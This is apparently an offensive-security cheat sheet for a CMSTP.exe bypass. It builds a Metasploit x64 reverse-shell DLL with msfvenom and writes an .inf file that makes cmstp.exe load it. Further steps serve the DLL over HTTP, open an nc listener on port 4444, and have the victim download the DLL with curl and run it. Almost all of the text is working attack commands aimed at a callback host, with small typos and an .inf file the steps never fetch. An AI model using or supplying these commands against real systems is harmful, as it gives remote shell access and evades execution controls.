# Attacker server
- Generating a simple x64 reverse shell in a .dll format:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.213.136 LPORT=4444 -f dll -o shell.dll
```
- Create .inf file loaded by csmtp.exe that whill load shell.dll
```bash
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
C:\shell.dll
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="mantvydas"
ShortSvcName="mantvydas"
```
- Run listening server:
```python
python3 -m http.server 80
nc -nvlp 4444
```
# Victim machine
- Open cmd.exe and run the following command
```cmd
curl -O http://192.168.213.136/shell.dll
cmstp.exe /s .\shell.inf
```
